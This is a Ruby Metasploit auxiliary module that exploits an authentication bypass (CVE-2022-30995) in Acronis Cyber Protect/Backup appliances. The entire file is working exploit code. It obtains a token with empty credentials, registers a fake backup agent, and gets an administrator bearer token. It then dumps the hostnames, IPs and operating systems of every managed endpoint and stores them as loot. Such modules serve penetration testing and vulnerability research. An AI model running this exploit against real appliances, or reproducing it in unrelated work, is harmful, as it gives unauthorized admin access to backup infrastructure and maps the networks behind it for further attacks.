##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary

  prepend Msf::Exploit::Remote::AutoCheck
  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Acronis Cyber Protect/Backup machine info disclosure',
        'Description' => %q{
          Acronis Cyber Protect or Backup is an enterprise backup/recovery solution for all,
          compute, storage and application resources. Businesses and Service Providers are using it
          to protect and backup all IT assets in their IT environment.
          This module exploits an authentication bypass vulnerability at the Acronis Cyber Protect
          appliance which, in its default configuration, allows the anonymous registration of new
          backup/protection agents on new endpoints. This API endpoint also generates bearer tokens
          which the agent then uses to authenticate to the appliance.
          As the management web console is running on the same port as the API for the agents, this
          bearer token is also valid for any actions on the web console. This allows an attacker
          with network access to the appliance to start the registration of a new agent, retrieve
          a bearer token that provides admin access to the available functions in the web console.

          This module will gather all machine info (endpoints) configured and managed by the appliance.
          This information can be used in a subsequent attack that exploits this vulnerability to
          execute arbitrary commands on both the managed endpoint and the appliance.
          This exploit is covered in another module `exploit/multi/acronis_cyber_protect_unauth_rce_cve_2022_3405`.

          Acronis Cyber Protect 15 (Windows, Linux) before build 29486 and
          Acronis Cyber Backup 12.5 (Windows, Linux) before build 16545 are vulnerable.
        },
        'Author' => [
          'h00die-gr3y <h00die.gr3y[at]gmail.com>', # Metasploit module
          'Sandro Tolksdorf of usd AG.'             # discovery
        ],
        'References' => [
          ['CVE', '2022-30995'],
          ['CVE', '2022-3405'],
          ['URL', 'https://herolab.usd.de/security-advisories/usd-2022-0008/'],
          ['URL', 'https://attackerkb.com/topics/27RudJXbN4/cve-2022-30995']
        ],
        'License' => MSF_LICENSE,
        'Privileged' => true,
        'DefaultOptions' => {
          'RPORT' => 9877,
          'SSL' => true
        },
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [ARTIFACTS_ON_DISK, IOC_IN_LOGS],
          'Reliability' => [REPEATABLE_SESSION]
        }
      )
    )
    register_options(
      [
        OptString.new('TARGETURI', [true, 'The URI of the vulnerable Acronis Cyber Protect/Backup instance', '/']),
        OptEnum.new('OUTPUT', [true, 'Output format to use', 'table', ['table', 'json']])
      ]
    )
  end

  # return first access_token or nil if not successful
  def get_access_token1
    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'idp', 'token'),
      'ctype' => 'application/x-www-form-urlencoded',
      'headers' => {
        'X-Requested-With' => 'XMLHttpRequest'
      },
      'vars_post' => {
        'grant_type' => 'password',
        'username' => nil,
        'password' => nil
      }
    })
    return unless res&.code == 200
    return unless res.body.include?('access_token')

    # parse json response and return access_token
    res_json = res.get_json_document
    return if res_json.blank?

    res_json['access_token']
  end

  # register a dummy agent in Acronis Cyber Protect 12.5 and 15.0
  # returns the client_secret if successful otherwise nil
  def dummy_agent_registration(client_id)
    name = Rex::Text.rand_text_alphanumeric(5..8).downcase
    post_data = {
      client_id: client_id.to_s,
      data: { agent_type: 'backupAgent', hostname: name.to_s, is_transient: true },
      tenant_id: nil,
      token_endpoint_auth_method: 'client_secret_basic',
      type: 'agent'
    }.to_json
    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'api', 'account_server', 'v2', 'clients'),
      'ctype' => 'application/json',
      'headers' => {
        'X-Requested-With' => 'XMLHttpRequest',
        'Authorization' => "bearer #{@access_token1}"
      },
      'data' => post_data.to_s
    })
    return unless res&.code == 201 && res.body.include?('client_id') && res.body.include?('client_secret')

    # parse json response and return client_secret
    res_json = res.get_json_document
    return if res_json.blank?

    res_json['client_secret']
  end

  # return second access_token or nil if not successful
  def get_access_token2(client_id, client_secret)
    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'idp', 'token'),
      'ctype' => 'application/x-www-form-urlencoded',
      'headers' => {
        'X-Requested-With' => 'XMLHttpRequest'
      },
      'vars_post' => {
        'grant_type' => 'client_credentials',
        'client_id' => client_id.to_s,
        'client_secret' => client_secret.to_s
      }
    })
    return unless res&.code == 200
    return unless res.body.include?('access_token')

    # parse json response and return access_token
    res_json = res.get_json_document
    return if res_json.blank?

    res_json['access_token']
  end

  # return all configured items in json format or return nil if not successful
  def get_machine_info
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'api', 'ams', 'resources'),
      'ctype' => 'application/json',
      'keep_cookies' => true,
      'headers' => {
        'X-Requested-With' => 'XMLHttpRequest',
        'Authorization' => "bearer #{@access_token2}"
      },
      'vars_get' => {
        'embed' => 'details'
      }
    })
    return unless res&.code == 200
    return unless res.body.include?('items') || res.body.include?('data')

    if datastore['OUTPUT'] == 'json'
      loot_path = store_loot('acronis.cyber.protect.config', 'application/json', datastore['RHOSTS'], res.body, 'configuration', 'endpoint configuration')
      print_good("Configuration details are successfully saved in json format to #{loot_path}")
    end

    # parse json response and get the relevant machine info
    res_json = res.get_json_document
    return if res_json.blank?

    res_json
  end

  # return version information or nil if not successful
  def get_version_info
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'api', 'ams', 'versions'),
      'ctype' => 'application/json',
      'headers' => {
        'X-Requested-With' => 'XMLHttpRequest',
        'Authorization' => "bearer #{@access_token2}"
      }
    })
    return unless res&.code == 200
    return unless res.body.include?('backendVersion')

    # parse json response and get the relevant machine info
    res_json = res.get_json_document
    return if res_json.blank?

    res_json['backendVersion']
  end

  # check if the target is running the acronis protect/backup and return the version information.
  def get_acronis_cyber_protect_version
    # initial check on api access
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'api', 'meta'),
      'ctype' => 'application/json'
    })
    return unless res&.code == 200 && res.body.include?('uri') && res.body.include?('method')

    # get first access token
    print_status('Retrieve the first access token.')
    @access_token1 = get_access_token1
    vprint_status("Extracted first access token: #{@access_token1}")
    if @access_token1.nil?
      print_warning('Retrieval of the first access token failed.')
      return nil
    end

    # register a dummy agent
    client_id = SecureRandom.uuid
    print_status('Register a dummy backup agent.')
    client_secret = dummy_agent_registration(client_id)
    if client_secret.nil?
      print_warning('Registering a dummy agent failed.')
      return nil
    end
    print_status('Dummy backup agent registration is successful.')

    # get second access_token
    print_status('Retrieve the second access token.')
    @access_token2 = get_access_token2(client_id, client_secret)
    vprint_status("Extracted second access token: #{@access_token2}")
    if @access_token2.nil?
      print_warning('Retrieval of the second  access token failed.')
      return nil
    end

    # get version info
    get_version_info
  end

  def check
    version = get_acronis_cyber_protect_version
    return Exploit::CheckCode::Unknown('Can not find any version information.') if version.nil?

    release = version.match(/(.+)\.(\d+)/)
    case release[1]
    when '15.0'
      if Rex::Version.new(version) < Rex::Version.new('15.0.29486')
        return Exploit::CheckCode::Appears("Acronis Cyber Protect/Backup #{version}")
      else
        return Exploit::CheckCode::Safe("Acronis Cyber Protect/Backup #{version}")
      end
    when '12.5'
      if Rex::Version.new(version) < Rex::Version.new('12.5.16545')
        return Exploit::CheckCode::Appears("Acronis Cyber Protect/Backup #{version}")
      else
        return Exploit::CheckCode::Safe("Acronis Cyber Protect/Backup #{version}")
      end
    else
      Exploit::CheckCode::Safe("Acronis Cyber Protect/Backup #{version}")
    end
  end

  def run
    # check if @access_token2 is already set as part of autocheck option
    if @access_token2.nil?
      # get first access token
      print_status('Retrieve the first access token.')
      @access_token1 = get_access_token1
      vprint_status("Extracted first access token: #{@access_token1}")
      fail_with(Failure::NoAccess, 'Retrieval of the first access token failed.') if @access_token1.nil?

      # register a dummy agent
      client_id = SecureRandom.uuid
      print_status('Register a dummy backup agent.')
      client_secret = dummy_agent_registration(client_id)
      fail_with(Failure::BadConfig, 'Registering a dummy agent failed.') if client_secret.nil?
      print_status('Dummy backup agent registration is successful.')

      # get second access_token
      print_status('Retrieve the second access token.')
      @access_token2 = get_access_token2(client_id, client_secret)
      vprint_status("Extracted second access token: #{@access_token2}")
      fail_with(Failure::NoAccess, 'Retrieval of the second access token failed.') if @access_token2.nil?
    end

    # report vulnerable instance
    report_web_vuln(
      web_site: normalize_uri(target_uri.path, 'api', 'ams', 'versions'),
      host: datastore['RHOSTS'],
      port: datastore['RPORT'],
      ssl: datastore['SSL'],
      method: 'POST',
      proof: "Authorization: Bearer #{@access_token2}",
      risk: 0,
      confidence: 100,
      category: 'admin token',
      description: 'Administrator token providing full web application accesss.',
      name: 'Acronis Cyber Protect/Backup administrator token'
    )
    # get all the managed endpoint configuration info
    print_status('Retrieve all managed endpoint configuration details registered at the Acronis Cyber Protect/Backup appliance.')
    res_json = get_machine_info
    fail_with(Failure::NotFound, 'Can not find any configuration information.') if res_json.nil?

    # print all the managed endpoint information to the console
    if datastore['OUTPUT'] == 'table'
      print_status('List the managed endpoints registered at the Acronis Cyber Protect/Backup appliance.')
      res_json['data'].each do |item|
        next unless item['type'] == 'machine'

        print_status('----------------------------------------')
        print_good("hostId: #{item['hostId']}") unless item['hostId'].nil?
        print_good("parentId: #{item['parentId']}") unless item['parentId'].nil?
        print_good("key: #{item['id']}") unless item['id'].nil?
        print_status("type: #{item['type']}") unless item['type'].nil?
        print_status("hostname: #{item['title']}") unless item['title'].nil?
        print_status("IP: #{item.dig('ip', 0)}") unless item.dig('ip', 0).nil?
        print_status("OS: #{item['os']}") unless item['os'].nil?
        print_status("ARCH: #{item['osType']}") unless item['osType'].nil?
        print_status("ONLINE: #{item['online']}") unless item['online'].nil?
      end
    end
  end
end
